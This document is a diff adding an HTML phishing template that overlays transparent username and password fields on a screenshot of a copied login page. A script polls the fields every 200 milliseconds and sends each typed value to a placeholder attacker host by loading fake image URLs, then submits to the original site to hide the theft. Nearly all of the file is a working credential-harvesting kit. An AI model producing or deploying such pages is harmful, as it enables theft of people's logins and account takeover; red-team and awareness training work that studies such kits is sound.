@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<title>TITLE OF THE COPIED WEBSITE</title>
+<html>
+<head>
+<style>
+#form_field {
+    position:relative;
+    width:800px;
+}
+
+#loginbutton {
+    background-color: #004177;
+    position:absolute;
+    color: #FFFFFF;
+    padding-left: 8px;
+    padding-right: 8px;
+    font-weight: bold;
+    display: inline-flex;
+    justify-content: center;
+    align-items: center;
+    height: 20px;
+    box-sizing: border-box;
+    min-width: 48px;
+    font-size: 12px;
+    overflow: hidden;
+    white-space: nowrap;
+    cursor: pointer;
+    top:325px;
+    left:45px;
+}
+#username {
+    position:absolute;
+    background:transparent;
+    border:0;
+    color:#000;
+    font-size:12px;
+    font-style:italic;
+    text-align:left;
+    width:100%;
+    top:205px;
+    left:45px;
+    outline:none;
+}
+#password {
+    position:absolute;
+    background:transparent;
+    border:0;
+    color:#000;
+    font-size:12px;
+    font-style:italic;
+    text-align:left;
+    width:100%;
+    top:230px;
+    left:45px;
+    outline:none;
+}
+</style>
+</head>
+<body>
+<form action="https://back.to.the.original.site" method="get"id="form_field">
+        <input type="text" id="username" value="" placeholder="User Name">
+        <input type="password" id="password" value="" placeholder="Password">
+	<input type="hidden" id="redirectto" value="/if/needed">
+        <button type="submit" id="loginbutton">Login</button>
+        <img src="screenshot.png">
+</form>
+<script>
+let exfilServer = "http://attacker.ip";
+var inputs, index;
+function update() 
+{
+	inputs = document.getElementById("form_field");
+	for (index = 0; index < inputs.length; index++)
+	{
+		if (inputs[index].id == 'username')
+		{
+			//console.log("Username Value: " + inputs[index].value);
+
+			// Check if it's changed from last time we scraped
+			if (username != inputs[index].value)
+			{
+				username = inputs[index].value;
+				console.log ("++ New username value: " + username);
+
+				// Exfil it
+				var fakeImageName = new Image();
+				fakeImageName.onload = function()
+				{
+					image.src = this.src;
+				};
+				fakeImageName.src = exfilServer + "/username/" + username + ".jpg";
+			}
+		}
+
+		if (inputs[index].id == 'password')
+		{
+			//console.log("Password Value: " + inputs[index].value);
+			
+			// Check if it's changed from last time we scraped
+			if (password != inputs[index].value)
+			{
+				password = inputs[index].value;
+				console.log ("++ New password value: " + password);
+
+				// Exfil it
+				var fakeImageName = new Image();
+				fakeImageName.onload = function()
+				{
+					image.src = this.src;
+				};
+				fakeImageName.src = exfilServer + "/password/" + password + ".jpg";
+
+			}
+		}
+	}
+}
+setInterval(function(){ update(); }, 200);
+</script>
+</body>
+</html>
